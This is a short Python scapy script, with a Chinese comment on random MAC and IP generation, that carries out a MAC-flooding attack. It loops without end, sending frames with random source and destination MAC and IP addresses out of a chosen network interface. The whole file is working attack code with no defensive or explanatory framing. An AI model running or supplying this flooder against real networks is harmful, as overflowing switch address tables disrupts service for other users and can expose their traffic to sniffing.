# -*- coding:utf-8 -*-
"""
RandMAC()随机产生mac
RandIP随机产生ip 
都可以接收模板，产生指定要求的mac或ip
"""
import sys
import time
from scapy.all import *


def mac_flood():
	iface = "eth0"
	if len(sys.argv) >= 2:
		iface = sys.argv[1]
	while 1:
		pkt = Ether(src=RandMAC(),dst=RandMAC()) / IP(
			src=RandIP(),dst=RandIP()) / ICMP()
		time.sleep(0.1)
		sendp(packet=pkt,iface=iface,loop=0)

if __name__ == '__main__':
	mac_flood()